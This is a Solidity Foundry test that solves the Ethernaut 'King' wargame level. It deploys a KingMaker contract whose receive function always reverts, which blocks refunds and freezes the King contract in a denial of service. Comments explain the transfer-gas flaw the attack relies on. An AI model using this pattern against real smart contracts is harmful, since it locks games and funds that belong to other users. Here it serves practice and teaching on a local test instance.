// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/09-King/KingFactory.sol";
import "../core/Ethernaut.sol";

contract KingTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // In the King contract, in receive function,
        // When someone claim Kingship, the contract will
        // return funds to last king by calling transfer
        // but transfer is limited to 2300 unit of gas
        // and a revert in the receive function of the last king
        // allows to not accept it.

        // Make an attack contract and send ether to it
        KingMaker kingMaker = new KingMaker{value: 0.01 ether}(address(ethernautKing));
        // Claim kingship
        kingMaker.beKing();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract KingMaker {
    address payable king;

    constructor(address _king) public payable {
        require(_king.code.length > 0, "Not a contract");
        king = payable(_king);
    }

    function beKing() external {
        king.call{value: 0.01 ether}("");
    }

    receive() external payable {
        revert("I do not accept ether in receive");
    }
}
